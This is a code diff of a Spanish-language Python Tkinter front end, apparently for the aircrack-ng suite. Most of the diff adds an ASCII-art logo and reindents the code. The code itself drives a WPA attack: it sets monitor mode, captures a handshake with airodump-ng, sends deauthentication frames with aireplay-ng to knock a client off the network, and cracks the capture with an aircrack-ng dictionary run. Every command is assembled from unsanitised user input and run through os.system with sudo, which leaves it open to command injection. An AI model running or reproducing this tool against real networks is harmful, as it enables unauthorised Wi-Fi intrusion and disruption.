@@ -15,6 +15,22 @@ C = '\033[1;36m'  # cyan
 GRs = '\033[1;37m'  # gray 
 os.system("clear")
 
+# Logo
+def logo():
+    	os.system("clear")
+    	print("""
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⡟⢁⣼⣿⣿⣿⣿⣿⣿⣏⠉⢿⣿⣿
+⣿⡟⢀⣾⠋⣸⣿⣿⣿⣿⣇⠙⣷⡀⢻⣿
+⣿⠁⢸⡇⢰⡏⢸⣿⣿⡇⢹⡇⢹⡇⢸⣿
+⣿⡆⢸⣧⠘⢷⣼⡏⢹⣧⡾⠃⣾⠇⢸⣿
+⣿⣷⡀⠻⣧⣼⣿⡇⢸⣿⣧⣾⠏⢠⣿⣿
+⣿⣿⣿⣦⣼⣿⣿⡇⢸⣿⣿⣧⣴⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⡇⢸⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⡇⢸⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣧⣼⣿⣿⣿⣿⣿⣿⣿
+""")
+
 #Base
 raiz=Tk()
 raiz.title("aicrack-ng GUI - Mrx04programmer")
@@ -43,54 +59,59 @@ miFrame.config(width="10000", height="5000")
 
 #Acciones de botón
 def monAction():
-	print(G+"[+] "+GRs+"Activando modo monitor en"+iface.get())
-	os.system("sudo airmon-ng start "+iface.get())
-	print(G+"[+] "+GRs+iface.get()+" a sido activada en modo monitor :)")
+		logo()
+		print(G+"[+] "+GRs+"Activando modo monitor en"+iface.get())
+		logo()
+		os.system("sudo airmon-ng start "+iface.get())
+		print(G+"[+] "+GRs+iface.get()+" a sido activada en modo monitor :)")
 def monA():
-	win=Toplevel()
-	win.geometry("255x100")
-	win.config(bg="black")
-	ifaceL=Label(win, bg="black", fg="white", text="Interfaz").place(x=100, y=5)
-	ifaceE=Entry(win, bg="white", fg="green", textvariable=iface).place(x=50, y=40)
-	ifaceB=Button(win, bg="white", fg="green", text="Activar", command=monAction).place(x=100, y=70)
+		win=Toplevel()
+		win.geometry("255x100")
+		win.config(bg="black")
+		ifaceL=Label(win, bg="black", fg="white", text="Interfaz").place(x=100, y=5)
+		ifaceE=Entry(win, bg="white", fg="green", textvariable=iface).place(x=50, y=40)
+		ifaceB=Button(win, bg="white", fg="green", text="Activar", command=monAction).place(x=100, y=70)
 def monOff():
-	print(G+"[-] "+GRs+"Desactivando modo monitor en "+iface.get())
-	os.system("sudo airmon-ng stop "+iface.get())
-	print(G+"[-] "+GRs+iface.get()+" a sido desactivada en modo monitor :)")
+		logo()
+		print(G+"[-] "+GRs+"Desactivando modo monitor en "+iface.get())
+		os.system("sudo airmon-ng stop "+iface.get())
+		print(G+"[-] "+GRs+iface.get()+" a sido desactivada en modo monitor :)")
 def monO():
-	win=Toplevel()
-	win.geometry("255x100")
-	win.config(bg="black")
-	ifaceL=Label(win, bg="black", fg="white", text="Interfaz").place(x=100, y=5)
-	ifaceE=Entry(win, bg="white", fg="green", textvariable=iface).place(x=50, y=40)
-	ifaceB=Button(win, bg="white", fg="green", text="Desactivar", command=monOff).place(x=100, y=70)
+		win=Toplevel()
+		win.geometry("255x100")
+		win.config(bg="black")
+		ifaceL=Label(win, bg="black", fg="white", text="Interfaz").place(x=100, y=5)
+		ifaceE=Entry(win, bg="white", fg="green", textvariable=iface).place(x=50, y=40)
+		ifaceB=Button(win, bg="white", fg="green", text="Desactivar", command=monOff).place(x=100, y=70)
 def estableceri():
-	messagebox.showinfo(message="La interfaz a trabajar a sido establecida("+iface.get()+")", title="Intefaz a trabajar")
+		messagebox.showinfo(message="La interfaz a trabajar a sido establecida("+iface.get()+")", title="Intefaz a trabajar")
 def ifaceD():
-	win=Toplevel()
-	win.geometry("255x100")
-	win.config(bg="black")
-	print(B+"[INTERFACES]"+W)
-	os.system("iwconfig")
-	ifaceL=Label(win, bg="black", fg="white", text="Establecer interfaz").place(x=70, y=5)
-	ifaceE=Entry(win, bg="white", fg="green", textvariable=iface).place(x=50, y=40)
-	ifaceB=Button(win, bg="white", fg="green", text="Establecer", command=estableceri).place(x=100, y=70)
+		win=Toplevel()
+		win.geometry("255x100")
+		win.config(bg="black")
+		logo()
+		print(B+"[INTERFACES]"+W)
+		os.system("iwconfig")
+		ifaceL=Label(win, bg="black", fg="white", text="Establecer interfaz").place(x=70, y=5)
+		ifaceE=Entry(win, bg="white", fg="green", textvariable=iface).place(x=50, y=40)
+		ifaceB=Button(win, bg="white", fg="green", text="Establecer", command=estableceri).place(x=100, y=70)
 def scanning():
-	messagebox.showinfo(message="Ctrl+C para parar y apunta el BSSID de una red y de un cliente del mismo.", title="AVISO DE AYUDA")
-	os.system("sudo airodump-ng "+iface.get())
-	print(G+"[!] "+GRs+"Establece el canal y bssid para comenzar el ataque ")
+		logo()
+		messagebox.showinfo(message="Ctrl+C para parar y apunta el BSSID de una red y de un cliente del mismo.", title="AVISO DE AYUDA")
+		os.system("sudo airodump-ng "+iface.get())
+		print(G+"[!] "+GRs+"Establece el canal y bssid para comenzar el ataque ")
 def channeli():
-	messagebox.showinfo(message="El canal a trabajar a sido establecida("+channel.get()+")", title="Canal a trabajar")
+		messagebox.showinfo(message="El canal a trabajar a sido establecida("+channel.get()+")", title="Canal a trabajar")
 def channelD():
-	win=Toplevel()
-	win.geometry("255x100")
-	win.config(bg="black")
-	channelL=Label(win, bg="black", fg="white", text="Canal o Channel").place(x=100, y=5)
-	channelE=Entry(win, bg="white", fg="green", textvariable=channel, width=5).place(x=100, y=40)
-	channelB=Button(win, bg="white", fg="green", text="Establecer", command=channeli).place(x=100, y=70)
+		win=Toplevel()
+		win.geometry("255x100")
+		win.config(bg="black")
+		channelL=Label(win, bg="black", fg="white", text="Canal o Channel").place(x=100, y=5)
+		channelE=Entry(win, bg="white", fg="green", textvariable=channel, width=5).place(x=100, y=40)
+		channelB=Button(win, bg="white", fg="green", text="Establecer", command=channeli).place(x=100, y=70)
 def bssidi():
-	messagebox.showinfo(message="El BSSID a sido establecido("+bssid.get()+")", title="BSSID a trabajar")
-	print(G+"[!] "+GRs+"Establece el nombre de captura para continuar con el ataque.")
+		messagebox.showinfo(message="El BSSID a sido establecido("+bssid.get()+")", title="BSSID a trabajar")
+		print(G+"[!] "+GRs+"Establece el nombre de captura para continuar con el ataque.")
 def bssidD():
 	win=Toplevel()
 	win.geometry("255x120")
@@ -127,13 +148,14 @@ def dicD():
 	clientE=Entry(win, bg="white", fg="black", textvariable=dic).place(x=50, y=40)
 	clientB=Button(win, bg="white", fg="green", text="Establecer", command=dici).place(x=100, y=70)
 def start():
-	print(B+"[*] "+GRs+"Iniciando ataque...esperando respuesta y luego desencriptar")
-	os.system("xterm -geometry 132x26 -e sudo airodump-ng -c "+channel.get()+" -w "+wname.get()+" --bssid "+bssid.get()+" "+iface.get()+" | xterm -geometry 132x16 -e sudo aireplay-ng --deauth 20 -a "+client.get()+" "+iface.get())
-	desea=input(C+"Desea ahora atacar con diccionario?[S/n]")
-	if desea == "S" or desea == "s":
-		os.system("sudo aircrack-ng -w "+dic.get()+" '"+wname.get()+"'")
-	else:
-		print(B+"[*] "+GRs+"Ataque terminado, Diviertete :)")
+		logo()
+		print(B+"[*] "+GRs+"Iniciando ataque...esperando respuesta y luego desencriptar")
+		os.system("xterm -geometry 132x26 -e sudo airodump-ng -c "+channel.get()+" -w "+wname.get()+" --bssid "+bssid.get()+" "+iface.get()+" | xterm -geometry 132x16 -e sudo aireplay-ng --deauth 20 -a "+client.get()+" "+iface.get())
+		desea=input(C+"Desea ahora atacar con diccionario?[S/n]")
+		if desea == "S" or desea == "s":
+			os.system("sudo aircrack-ng -w "+dic.get()+" '"+wname.get()+"'")
+		else:
+			print(B+"[*] "+GRs+"Ataque terminado, Diviertete :)")
 
 
 #Botones y título
